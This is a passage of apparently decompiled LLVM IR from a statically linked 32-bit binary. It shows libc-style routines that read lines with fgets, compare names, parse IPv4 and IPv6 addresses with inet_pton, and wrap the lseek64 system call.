  %v3_80545c8 = mul i32 %v0_80545c3, 4
  %v4_80545c8 = add i32 %v1_80545c8, %v3_80545c8
  %v5_80545c8 = inttoptr i32 %v4_80545c8 to i32*
  store i32 %v0_80545ab103, i32* %v5_80545c8, align 4
  %v0_80545cb = load i32, i32* @edi, align 4
  %v1_80545cb = add i32 %v0_80545cb, 1
  store i32 %v1_80545cb, i32* @edi, align 4
  %v0_80545cf.pre.pre = load i32, i32* @ecx, align 4
  %v4_80545cf.pre.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80545cf.preheader

dec_label_pc_80545cf.preheader:                   ; preds = %dec_label_pc_80545c8, %dec_label_pc_80545c3
  %v4_80545cf.pre = phi i32 [ %v4_80545cf.pre.pre, %dec_label_pc_80545c8 ], [ %v0_80545b8, %dec_label_pc_80545c3 ]
  %v0_80545cf.pre = phi i32 [ %v0_80545cf.pre.pre, %dec_label_pc_80545c8 ], [ %v0_80545ab103, %dec_label_pc_80545c3 ]
  %v0_80545e854 = phi i32 [ %v1_80545cb, %dec_label_pc_80545c8 ], [ %v0_80545c3, %dec_label_pc_80545c3 ]
  %v1_80545cf106 = inttoptr i32 %v0_80545cf.pre to i8*
  %v2_80545cf107 = load i8, i8* %v1_80545cf106, align 1
  %v3_80545cf108 = zext i8 %v2_80545cf107 to i32
  %v5_80545cf109 = and i32 %v4_80545cf.pre, -256
  %v6_80545cf110 = or i32 %v3_80545cf108, %v5_80545cf109
  store i32 %v6_80545cf110, i32* @eax, align 4
  %v4_80545d1111 = icmp eq i8 %v2_80545cf107, 0
  br i1 %v4_80545d1111, label %dec_label_pc_80545e3.loopexit, label %dec_label_pc_80545d5.lr.ph

dec_label_pc_80545d5.lr.ph:                       ; preds = %dec_label_pc_80545cf.preheader
  %v0_80545d8.pre = load i32, i32* @global_var_8058218, align 8
  br label %dec_label_pc_80545d5

dec_label_pc_80545ce:                             ; preds = %dec_label_pc_80545d5
  %v1_80545ce = add i32 %v0_80545e3113, 1
  store i32 %v1_80545ce, i32* @ecx, align 4
  %v1_80545cf = inttoptr i32 %v1_80545ce to i8*
  %v2_80545cf = load i8, i8* %v1_80545cf, align 1
  %v3_80545cf = zext i8 %v2_80545cf to i32
  %v5_80545cf = and i32 %v0_80545d8.pre, -256
  %v6_80545cf = or i32 %v3_80545cf, %v5_80545cf
  store i32 %v6_80545cf, i32* @eax, align 4
  %v4_80545d1 = icmp eq i8 %v2_80545cf, 0
  br i1 %v4_80545d1, label %dec_label_pc_80545e3.loopexit, label %dec_label_pc_80545d5

dec_label_pc_80545d5:                             ; preds = %dec_label_pc_80545d5.lr.ph, %dec_label_pc_80545ce
  %v2_80545cf115 = phi i8 [ %v2_80545cf107, %dec_label_pc_80545d5.lr.ph ], [ %v2_80545cf, %dec_label_pc_80545ce ]
  %v1_80545cf114 = phi i8* [ %v1_80545cf106, %dec_label_pc_80545d5.lr.ph ], [ %v1_80545cf, %dec_label_pc_80545ce ]
  %v0_80545e3113 = phi i32 [ %v0_80545cf.pre, %dec_label_pc_80545d5.lr.ph ], [ %v1_80545ce, %dec_label_pc_80545ce ]
  %v2_80545d5 = sext i8 %v2_80545cf115 to i32
  store i32 %v2_80545d5, i32* @edx, align 4
  store i32 %v0_80545d8.pre, i32* @eax, align 4
  %v2_80545dd = mul nsw i32 %v2_80545d5, 2
  %v3_80545dd = add i32 %v0_80545d8.pre, %v2_80545dd
  %v4_80545dd = inttoptr i32 %v3_80545dd to i8*
  %v5_80545dd = load i8, i8* %v4_80545dd, align 1
  %v6_80545dd = and i8 %v5_80545dd, 32
  %v7_80545dd = icmp eq i8 %v6_80545dd, 0
  br i1 %v7_80545dd, label %dec_label_pc_80545ce, label %dec_label_pc_80545e3.loopexit

dec_label_pc_80545e3.loopexit:                    ; preds = %dec_label_pc_80545d5, %dec_label_pc_80545ce, %dec_label_pc_80545cf.preheader
  %v4_80545af98139 = phi i32 [ %v6_80545cf110, %dec_label_pc_80545cf.preheader ], [ %v6_80545cf, %dec_label_pc_80545ce ], [ %v0_80545d8.pre, %dec_label_pc_80545d5 ]
  %v0_80545e3.lcssa = phi i32 [ %v0_80545cf.pre, %dec_label_pc_80545cf.preheader ], [ %v1_80545ce, %dec_label_pc_80545ce ], [ %v0_80545e3113, %dec_label_pc_80545d5 ]
  %v1_80545cf.lcssa = phi i8* [ %v1_80545cf106, %dec_label_pc_80545cf.preheader ], [ %v1_80545cf, %dec_label_pc_80545ce ], [ %v1_80545cf114, %dec_label_pc_80545d5 ]
  %v2_80545e3 = load i8, i8* %v1_80545cf.lcssa, align 1
  %v3_80545e3 = icmp eq i8 %v2_80545e3, 0
  %v1_80545e6 = icmp eq i1 %v3_80545e3, false
  br i1 %v1_80545e6, label %dec_label_pc_80545af.preheader, label %dec_label_pc_80545e8

dec_label_pc_80545af.preheader:                   ; preds = %dec_label_pc_80545af.preheader.preheader, %dec_label_pc_80545e3.loopexit
  %v0_80545e8.pre142 = phi i32 [ %v0_80545e854, %dec_label_pc_80545e3.loopexit ], [ 0, %dec_label_pc_80545af.preheader.preheader ]
  %v4_80545af98 = phi i32 [ %v4_80545af98139, %dec_label_pc_80545e3.loopexit ], [ %v4_80545af98.pre, %dec_label_pc_80545af.preheader.preheader ]
  %v0_80545af49 = phi i32 [ %v0_80545e3.lcssa, %dec_label_pc_80545e3.loopexit ], [ %stack_var_-20.0.in, %dec_label_pc_80545af.preheader.preheader ]
  %v1_80545af95 = inttoptr i32 %v0_80545af49 to i8*
  %v2_80545af96 = load i8, i8* %v1_80545af95, align 1
  %v3_80545af97 = zext i8 %v2_80545af96 to i32
  %v5_80545af99 = and i32 %v4_80545af98, -256
  %v6_80545af100 = or i32 %v5_80545af99, %v3_80545af97
  store i32 %v6_80545af100, i32* @eax, align 4
  %v4_80545b1101 = icmp eq i8 %v2_80545af96, 0
  br i1 %v4_80545b1101, label %dec_label_pc_80545e8, label %dec_label_pc_80545b5

dec_label_pc_80545af.dec_label_pc_80545e8.loopexit_crit_edge: ; preds = %dec_label_pc_80545ab
  %v0_80545e8.pre.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_80545e8

dec_label_pc_80545e8:                             ; preds = %dec_label_pc_80545e3.loopexit, %dec_label_pc_80545af.dec_label_pc_80545e8.loopexit_crit_edge, %dec_label_pc_80545af.preheader, %dec_label_pc_80545a3
  %v1_80545eb = phi i32 [ 0, %dec_label_pc_80545a3 ], [ %v0_80545e8.pre.pre, %dec_label_pc_80545af.dec_label_pc_80545e8.loopexit_crit_edge ], [ %v0_80545e8.pre142, %dec_label_pc_80545af.preheader ], [ %v0_80545e854, %dec_label_pc_80545e3.loopexit ]
  %v0_80545eb = load i32, i32* @ebx, align 4
  %v2_80545eb = mul i32 %v1_80545eb, 4
  %v3_80545eb = add i32 %v0_80545eb, %v2_80545eb
  %v4_80545eb = inttoptr i32 %v3_80545eb to i32*
  store i32 0, i32* %v4_80545eb, align 4
  %v7_80545f2 = icmp sgt i32 %v1_80545eb, 1
  br i1 %v7_80545f2, label %dec_label_pc_80545f8, label %dec_label_pc_805468b

dec_label_pc_80545f8:                             ; preds = %dec_label_pc_80545e8
  br i1 %v12_805442a, label %dec_label_pc_80546c5, label %dec_label_pc_8054603

dec_label_pc_8054603:                             ; preds = %dec_label_pc_80545f8
  store i32 1, i32* @esi, align 4
  br i1 %v1_805460d, label %dec_label_pc_805463b.preheader, label %dec_label_pc_805460f

dec_label_pc_805463b.preheader:                   ; preds = %dec_label_pc_8054603
  %v1_805463b119 = load i32, i32* @edi, align 4
  %v5_805463d128 = icmp sgt i32 %v1_805463b119, 1
  br i1 %v5_805463d128, label %dec_label_pc_8054625.lr.ph, label %dec_label_pc_805468b

dec_label_pc_8054625.lr.ph:                       ; preds = %dec_label_pc_805463b.preheader
  br label %dec_label_pc_8054625

dec_label_pc_805460f:                             ; preds = %dec_label_pc_8054603
  %v0_805460f = load i32, i32* @eax, align 4
  %v0_8054611 = load i32, i32* @ebx, align 4
  %v1_8054611 = inttoptr i32 %v0_8054611 to i32*
  %v2_8054611 = load i32, i32* %v1_8054611, align 4
  %v5_8054617 = call i32 @__GI_strcoll(i8* %v2_805462e, i32 %v2_8054611, i32 %v0_805460f, i32 %v0_805460f)
  store i32 %v5_8054617, i32* %eax.global-to-local, align 4
  %v1_805461f = icmp eq i32 %v5_8054617, 0
  %v1_8054621 = icmp eq i1 %v1_805461f, false
  br i1 %v1_8054621, label %dec_label_pc_805468b, label %dec_label_pc_8054641

dec_label_pc_8054625:                             ; preds = %dec_label_pc_8054625.lr.ph, %dec_label_pc_805463a
  %v1_8054627129 = phi i32 [ 1, %dec_label_pc_8054625.lr.ph ], [ %v1_805463a, %dec_label_pc_805463a ]
  %v0_8054627 = load i32, i32* @ebx, align 4
  %v2_8054627 = mul i32 %v1_8054627129, 4
  %v3_8054627 = add i32 %v0_8054627, %v2_8054627
  %v4_8054627 = inttoptr i32 %v3_8054627 to i32*
  %v5_8054627 = load i32, i32* %v4_8054627, align 4
  %v3_805462e = call i32 @__GI_strcasecmp(i8* %v2_805462e, i32 %v5_8054627)
  store i32 %v3_805462e, i32* %eax.global-to-local, align 4
  %v1_8054636 = icmp eq i32 %v3_805462e, 0
  br i1 %v1_8054636, label %dec_label_pc_8054641, label %dec_label_pc_805463a

dec_label_pc_805463a:                             ; preds = %dec_label_pc_8054625
  %v0_805463a = load i32, i32* @esi, align 4
  %v1_805463a = add i32 %v0_805463a, 1
  store i32 %v1_805463a, i32* @esi, align 4
  %v1_805463b = load i32, i32* @edi, align 4
  %v5_805463d = icmp slt i32 %v1_805463a, %v1_805463b
  br i1 %v5_805463d, label %dec_label_pc_8054625, label %dec_label_pc_805468b

dec_label_pc_8054641:                             ; preds = %dec_label_pc_805460f, %dec_label_pc_8054625
  br i1 %v1_8054646, label %dec_label_pc_8054663, label %dec_label_pc_8054648

dec_label_pc_8054648:                             ; preds = %dec_label_pc_8054641
  %v0_8054648 = load i32, i32* @esi, align 4
  %v3_8054649 = load i8*, i8** %stack_var_-44, align 4
  %v4_8054649 = ptrtoint i8* %v3_8054649 to i32
  %v0_805464d = load i32, i32* @ebx, align 4
  %v1_805464d = inttoptr i32 %v0_805464d to i32*
  %v2_805464d = load i32, i32* %v1_805464d, align 4
  %v4_8054651 = inttoptr i32 %v2_805464d to i8*
  %v5_8054651 = call i32 @inet_pton(i32 2, i8* %v4_8054651, i32 %v4_8054649, i32 %v0_8054648)
  store i32 %v5_8054651, i32* %eax.global-to-local, align 4
  %tmp85 = icmp slt i32 %v5_8054651, 1
  %tmp86 = icmp eq i1 %tmp85, false
  br i1 %tmp86, label %dec_label_pc_80544e1, label %dec_label_pc_805468b.outer

dec_label_pc_8054663:                             ; preds = %dec_label_pc_8054641
  br i1 %v1_8054668, label %dec_label_pc_805468b.outer, label %dec_label_pc_805466a

dec_label_pc_805466a:                             ; preds = %dec_label_pc_8054663
  %v0_805466a = load i32, i32* @ecx, align 4
  %v0_805466f = load i32, i32* @ebx, align 4
  %v1_805466f = inttoptr i32 %v0_805466f to i32*
  %v2_805466f = load i32, i32* %v1_805466f, align 4
  %v4_8054673 = inttoptr i32 %v2_805466f to i8*
  %v5_8054673 = call i32 @inet_pton(i32 10, i8* %v4_8054673, i32 %stack_var_-36.0, i32 %v0_805466a)
  store i32 %v5_8054673, i32* %eax.global-to-local, align 4
  %tmp87 = icmp slt i32 %v5_8054673, 1
  %tmp88 = icmp eq i1 %tmp87, false
  br i1 %tmp88, label %dec_label_pc_805450e, label %dec_label_pc_805468b.outer

dec_label_pc_805468b:                             ; preds = %dec_label_pc_805463b.preheader, %dec_label_pc_805463a, %dec_label_pc_80545e8, %dec_label_pc_805460f, %dec_label_pc_805468b.outer
  %v0_805468b = load i32, i32* @edx, align 4
  %v3_8054695 = call i32 @fgets(i32 %stack_var_-20.0.in, i32 %stack_var_4.0, i32 %v0_805468b)
  store i32 %v3_8054695, i32* @eax, align 4
  %v1_805469d = icmp eq i32 %v3_8054695, 0
  %v1_805469f = icmp eq i1 %v1_805469d, false
  br i1 %v1_805469f, label %dec_label_pc_805458c, label %dec_label_pc_80546a5

dec_label_pc_80546a5:                             ; preds = %dec_label_pc_805468b, %dec_label_pc_805453a
  %stack_var_-28.1 = phi i32 [ 0, %dec_label_pc_805453a ], [ %stack_var_-28.0.ph, %dec_label_pc_805468b ]
  br i1 %v12_805442a, label %dec_label_pc_80546c5, label %dec_label_pc_80546ac

dec_label_pc_80546ac:                             ; preds = %dec_label_pc_80546a5
  %v1_80546b3 = inttoptr i32 %stack_var_4.0 to i16*
  %v2_80546b3 = call i32 @__GI_fclose(i16* %v1_80546b3)
  store i32 %v2_80546b3, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80546c5

dec_label_pc_80546c5:                             ; preds = %dec_label_pc_80545f8, %dec_label_pc_8054415, %dec_label_pc_8054421, %dec_label_pc_805443f, %dec_label_pc_8054452, %dec_label_pc_805445e, %dec_label_pc_8054467, %dec_label_pc_8054491, %dec_label_pc_80546a5, %dec_label_pc_80546ac, %dec_label_pc_80544c7
  %stack_var_-28.2 = phi i32 [ %stack_var_-28.1, %dec_label_pc_80546a5 ], [ %stack_var_-28.1, %dec_label_pc_80546ac ], [ %v2_80544d6, %dec_label_pc_80544c7 ], [ 34, %dec_label_pc_8054491 ], [ 34, %dec_label_pc_8054467 ], [ 34, %dec_label_pc_805445e ], [ 34, %dec_label_pc_8054452 ], [ 34, %dec_label_pc_805443f ], [ 34, %dec_label_pc_8054421 ], [ 34, %dec_label_pc_8054415 ], [ %stack_var_-28.0.ph, %dec_label_pc_80545f8 ]
  store i32 %stack_var_-28.2, i32* %eax.global-to-local, align 4
  store i32 %v0_8054400, i32* @ebx, align 4
  store i32 %v0_80543ff, i32* @esi, align 4
  store i32 %v0_80543fe, i32* @edi, align 4
  store i32 %v0_80543fd, i32* @ebp, align 4
  ret i32 %stack_var_-28.2

; uselistorder directives
  uselistorder i32 %stack_var_-28.2, { 1, 0 }
  uselistorder i32 %v1_805463a, { 0, 2, 1 }
  uselistorder i32 %v1_80545eb, { 1, 0 }
  uselistorder i8 %v2_80545af96, { 1, 2, 0 }
  uselistorder i8* %v1_80545af95, { 1, 0 }
  uselistorder i32 %v0_80545af49, { 1, 0 }
  uselistorder i32 %v2_80545d5, { 1, 0 }
  uselistorder i32 %v1_80545ce, { 0, 2, 1, 3 }
  uselistorder i32 %v0_80545d8.pre, { 0, 2, 3, 1 }
  uselistorder i32 %v1_80545c3, { 1, 0 }
  uselistorder i32 %v0_80545c3, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_80545b5, { 1, 0 }
  uselistorder i8* %v2_805462e, { 1, 0 }
  uselistorder i32 %storemerge3, { 1, 2, 0 }
  uselistorder i32 %stack_var_4.0, { 1, 0 }
  uselistorder i32 %stack_var_-40.0, { 1, 2, 0 }
  uselistorder i32 %stack_var_-20.0.in, { 2, 0, 1, 3 }
  uselistorder i32 %v0_8054473, { 2, 1, 0, 3 }
  uselistorder i32 %v0_8054452, { 1, 0, 2, 3 }
  uselistorder i32 %v1_805442f, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_8054436, { 1, 0 }
  uselistorder i32 %v1_8054410, { 4, 3, 2, 1, 0 }
  uselistorder i8** %stack_var_-44, { 2, 0, 1 }
  uselistorder i32 %tmp60, { 0, 3, 1, 2 }
  uselistorder i32* %edx.global-to-local, { 4, 5, 6, 0, 1, 2, 3, 7, 8, 9, 10, 11, 13, 12, 14 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 4, 8, 9, 10, 12, 13, 11, 2, 3, 5, 6, 7, 14, 17, 15, 16, 18, 19, 20, 21, 22 }
  uselistorder i32 34, { 2, 3, 4, 5, 6, 7, 8, 11, 12, 13, 14, 10, 0, 1, 16, 17, 15, 9 }
  uselistorder i32 (i16*)* @__GI_fclose, { 3, 4, 0, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @fgets, { 1, 0, 2 }
  uselistorder i32 (i8*, i32)* @__GI_strcasecmp, { 1, 0 }
  uselistorder i32 5, { 13, 24, 25, 26, 0, 12, 7, 8, 17, 9, 27, 28, 1, 3, 21, 14, 22, 23, 6, 18, 5, 19, 4, 20, 10, 11, 15, 16, 2 }
  uselistorder i32 -6, { 1, 0, 2 }
  uselistorder i8 32, { 20, 21, 22, 23, 24, 16, 0, 7, 17, 13, 14, 15, 8, 25, 18, 19, 26, 27, 2, 11, 3, 9, 1, 12, 4, 10, 5, 6 }
  uselistorder i32* @global_var_8058218, { 0, 4, 2, 5, 1, 3, 6, 7 }
  uselistorder i32 -256, { 1, 71, 0, 72, 12, 19, 73, 75, 3, 37, 36, 2, 76, 77, 6, 78, 4, 79, 5, 80, 90, 8, 39, 38, 7, 53, 54, 81, 55, 56, 57, 58, 59, 60, 13, 61, 87, 88, 92, 14, 26, 15, 93, 94, 85, 84, 9, 25, 74, 82, 62, 63, 64, 65, 66, 67, 68, 10, 69, 70, 83, 20, 21, 22, 23, 24, 27, 28, 29, 30, 31, 32, 33, 34, 35, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 16, 17, 18, 11, 86, 89, 91 }
  uselistorder i32 35, { 0, 2, 1 }
  uselistorder i32 10, { 19, 0, 27, 28, 29, 30, 31, 32, 1, 11, 20, 2, 7, 33, 8, 9, 10, 21, 3, 13, 25, 26, 12, 35, 22, 4, 18, 17, 14, 15, 6, 34, 23, 24, 16, 5 }
  uselistorder i32 12, { 74, 75, 76, 0, 77, 16, 39, 1, 78, 93, 23, 21, 6, 22, 7, 8, 9, 10, 11, 12, 13, 79, 57, 58, 59, 60, 61, 62, 63, 64, 2, 17, 18, 65, 66, 67, 127, 25, 40, 73, 92, 41, 42, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 43, 44, 45, 46, 47, 48, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 24, 126, 82, 83, 84, 85, 128, 68, 3, 4, 69, 70, 14, 15, 71, 5, 80, 81, 49, 50, 51, 52, 53, 19, 54, 55, 20, 56, 72, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 86, 87, 88, 89, 90, 91 }
  uselistorder i32 80, { 0, 4, 5, 6, 7, 8, 9, 10, 1, 2, 3 }
  uselistorder i32 56, { 6, 5, 11, 0, 12, 13, 14, 15, 2, 8, 3, 9, 4, 1, 16, 10, 7 }
  uselistorder i32 44, { 8, 9, 10, 5, 0, 6, 7, 20, 12, 4, 17, 19, 18, 14, 15, 16, 13, 11, 1, 2, 3 }
  uselistorder i32 36, { 11, 12, 13, 15, 16, 17, 18, 19, 20, 2, 21, 3, 4, 22, 14, 6, 7, 8, 9, 10, 5, 0, 1 }
  uselistorder i32 -44, { 1, 0 }
  uselistorder i32 48, { 14, 16, 17, 0, 7, 4, 1, 9, 5, 6, 10, 11, 12, 13, 3, 2, 15, 8 }
  uselistorder i32 -48, { 2, 3, 4, 1, 0 }
  uselistorder i32 16, { 86, 85, 0, 87, 88, 13, 8, 89, 14, 90, 52, 53, 98, 99, 100, 101, 102, 103, 110, 104, 105, 106, 107, 108, 109, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 91, 92, 93, 94, 54, 55, 56, 57, 58, 59, 60, 61, 131, 15, 16, 28, 19, 42, 29, 37, 82, 38, 135, 1, 39, 40, 41, 3, 2, 129, 5, 4, 130, 7, 6, 121, 122, 17, 136, 95, 96, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 20, 77, 78, 79, 80, 132, 133, 134, 97, 12, 9, 27, 21, 43, 44, 45, 46, 47, 48, 49, 50, 51, 18, 22, 81, 30, 31, 32, 33, 34, 35, 36, 83, 84, 11, 23, 123, 124, 125, 126, 127, 24, 128, 10, 25, 26 }
  uselistorder i32 8, { 122, 121, 123, 0, 1, 124, 125, 126, 127, 128, 129, 7, 130, 2, 16, 131, 132, 133, 134, 32, 135, 89, 36, 18, 19, 20, 21, 37, 22, 23, 38, 39, 24, 40, 25, 41, 42, 137, 90, 91, 92, 93, 94, 95, 34, 33, 96, 97, 98, 99, 198, 199, 200, 29, 206, 30, 207, 31, 46, 26, 67, 120, 150, 68, 69, 152, 153, 154, 155, 156, 157, 158, 8, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 9, 70, 71, 72, 73, 74, 75, 76, 77, 169, 170, 171, 172, 173, 44, 10, 45, 11, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 43, 191, 192, 12, 193, 194, 195, 196, 13, 197, 144, 145, 3, 205, 100, 138, 139, 4, 5, 47, 101, 102, 103, 104, 106, 107, 108, 105, 109, 110, 111, 112, 27, 28, 113, 114, 115, 116, 117, 118, 201, 202, 203, 140, 141, 142, 143, 136, 204, 78, 6, 79, 80, 35, 81, 82, 83, 84, 85, 86, 87, 88, 119, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 17, 146, 147, 148, 149, 151, 15, 14 }
  uselistorder i32 -36, { 1, 0 }
  uselistorder i32 -32, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 32, { 71, 0, 72, 73, 28, 30, 78, 29, 79, 80, 81, 42, 43, 60, 85, 31, 51, 53, 54, 55, 56, 5, 4, 6, 7, 44, 8, 9, 52, 10, 11, 12, 13, 14, 1, 76, 74, 75, 61, 62, 2, 63, 64, 65, 66, 67, 68, 69, 15, 70, 45, 83, 84, 77, 82, 57, 58, 59, 33, 16, 46, 47, 17, 48, 3, 19, 18, 34, 35, 49, 36, 20, 21, 23, 22, 37, 25, 24, 38, 40, 27, 26, 39, 41, 32, 50 }
  uselistorder i32 4, { 259, 260, 261, 255, 253, 254, 256, 257, 258, 0, 5, 262, 263, 264, 265, 266, 267, 268, 269, 270, 33, 54, 145, 146, 147, 34, 35, 36, 271, 49, 1, 186, 6, 7, 200, 201, 202, 203, 204, 205, 272, 273, 276, 277, 278, 279, 280, 281, 59, 282, 288, 289, 290, 67, 37, 291, 292, 293, 294, 38, 39, 40, 68, 41, 42, 69, 43, 295, 44, 296, 70, 45, 71, 72, 8, 283, 284, 73, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 55, 216, 367, 217, 368, 369, 375, 376, 381, 382, 383, 370, 50, 93, 160, 161, 371, 372, 373, 374, 9, 148, 149, 150, 151, 74, 240, 241, 242, 60, 307, 308, 309, 310, 152, 153, 154, 155, 156, 61, 10, 157, 158, 377, 379, 321, 322, 323, 324, 325, 326, 11, 327, 328, 329, 330, 331, 332, 333, 334, 319, 320, 162, 46, 163, 164, 165, 166, 167, 168, 169, 12, 171, 170, 335, 52, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 31, 356, 357, 53, 358, 13, 159, 378, 172, 173, 297, 298, 51, 299, 300, 301, 302, 2, 14, 3, 380, 15, 174, 218, 16, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 47, 48, 94, 75, 236, 237, 238, 285, 286, 56, 287, 274, 275, 76, 175, 176, 177, 17, 178, 18, 32, 19, 20, 179, 180, 21, 181, 77, 182, 78, 183, 79, 184, 80, 185, 187, 188, 189, 57, 190, 191, 192, 62, 63, 81, 82, 83, 84, 85, 64, 193, 86, 194, 65, 195, 196, 58, 197, 198, 199, 66, 239, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 91, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 87, 303, 304, 305, 306, 311, 22, 23, 312, 24, 88, 89, 92, 313, 90, 25, 26, 314, 315, 316, 317, 27, 4, 28, 29, 318, 30, 359, 360, 361, 362, 363, 364, 365, 366, 384, 385, 386, 144 }
  uselistorder i32* @ebp, { 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 9, 10, 11, 12, 13, 14, 15, 2, 86, 87, 88, 93, 89, 90, 91, 92, 94, 34, 35, 95, 99, 110, 111, 141, 142, 143, 36, 37, 38, 39, 40, 16, 17, 18, 69, 70, 192, 193, 194, 195, 196, 19, 20, 197, 198, 199, 200, 201, 202, 203, 204, 209, 205, 206, 207, 208, 1, 210, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 4, 41, 42, 43, 44, 45, 105, 0, 106, 107, 108, 109, 100, 101, 102, 103, 104, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 3, 62, 6, 7, 8, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 63, 64, 65, 96, 97, 98, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 66, 67, 68, 5, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 179, 180, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 211, 212, 213, 214, 217, 218, 215, 216, 219, 220 }
  uselistorder i32 %arg9, { 3, 1, 2, 0 }
  uselistorder i32 %arg8, { 3, 2, 1, 0 }
  uselistorder i32 %arg7, { 1, 0, 2, 3 }
  uselistorder i32 %arg6, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_80546c5, { 9, 8, 0, 10, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_805468b, { 1, 3, 0, 2, 4 }
  uselistorder label %dec_label_pc_8054641, { 1, 0 }
  uselistorder label %dec_label_pc_8054625, { 1, 0 }
  uselistorder label %dec_label_pc_80545e8, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_80545af.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_80545d5, { 1, 0 }
  uselistorder label %dec_label_pc_80545a3, { 1, 0 }
  uselistorder label %dec_label_pc_805468b.outer, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_8054575, { 1, 0 }
  uselistorder label %dec_label_pc_805453a, { 1, 0 }
  uselistorder label %dec_label_pc_8054491, { 1, 0 }
  uselistorder label %dec_label_pc_8054421, { 1, 0 }
}

define i32 @__libc_lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_80546d6 = load i32, i32* @ebx, align 4
  store i32 %v0_80546d6, i32* %stack_var_-12, align 4
  %v2_80546de = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_80546de, i32* %esi.global-to-local, align 4
  %v1_80546f8 = call i32 @int80_syscall(i32 140)
  store i32 %v1_80546f8, i32* %esi.global-to-local, align 4
  %tmp16 = icmp ult i32 %v1_80546f8, -4095
  br i1 %tmp16, label %dec_label_pc_8054712, label %dec_label_pc_8054704

dec_label_pc_8054704:                             ; preds = %entry
  %v1_8054704 = call i32 @__errno_location(i32 %arg3)
  %v0_8054709 = load i32, i32* %esi.global-to-local, align 4
  %v1_8054709 = sub i32 0, %v0_8054709
  %v2_805470b = inttoptr i32 %v1_8054704 to i32*
  store i32 %v1_8054709, i32* %v2_805470b, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8054716

dec_label_pc_8054712:                             ; preds = %entry
  %v1_8054712 = icmp eq i32 %v1_80546f8, 0
  br i1 %v1_8054712, label %dec_label_pc_805471b, label %dec_label_pc_8054716

dec_label_pc_8054716:                             ; preds = %dec_label_pc_8054712, %dec_label_pc_8054704
  %v0_8054716 = phi i32 [ %v1_80546f8, %dec_label_pc_8054712 ], [ -1, %dec_label_pc_8054704 ]
  %v1_8054718 = ashr i32 %v0_8054716, 31
  br label %dec_label_pc_8054723

dec_label_pc_805471b:                             ; preds = %dec_label_pc_8054712
  %v3_805471b = load i32, i32* %stack_var_-20, align 4
  br label %dec_label_pc_8054723

dec_label_pc_8054723:                             ; preds = %dec_label_pc_8054716, %dec_label_pc_805471b
  %v0_8054729 = phi i32 [ %v0_8054716, %dec_label_pc_8054716 ], [ %v3_805471b, %dec_label_pc_805471b ]
  %storemerge = phi i32 [ %v1_8054718, %dec_label_pc_8054716 ], [ %tmp, %dec_label_pc_805471b ]
  store i32 %storemerge, i32* @edx, align 4
  %v2_8054726 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8054726, i32* @ebx, align 4
  ret i32 %v0_8054729

; uselistorder directives
  uselistorder i32 %v1_80546f8, { 1, 2, 0, 3 }
  uselistorder i32 31, { 20, 15, 21, 27, 28, 22, 23, 11, 2, 3, 0, 1, 10, 26, 16, 17, 18, 6, 7, 4, 5, 12, 8, 9, 24, 25, 19, 13, 14 }
  uselistorder i32 (i32)* @__errno_location, { 53, 44, 71, 70, 69, 43, 42, 52, 51, 41, 25, 37, 50, 49, 18, 54, 24, 64, 13, 12, 11, 10, 1, 68, 0, 23, 22, 9, 21, 63, 62, 40, 39, 67, 66, 65, 61, 20, 19, 60, 17, 36, 48, 47, 46, 2, 31, 38, 14, 45, 8, 7, 59, 33, 32, 58, 29, 6, 16, 3, 28, 15, 57, 56, 35, 27, 26, 55, 5, 4, 72, 34, 30 }
  uselistorder i32 140, { 1, 0 }
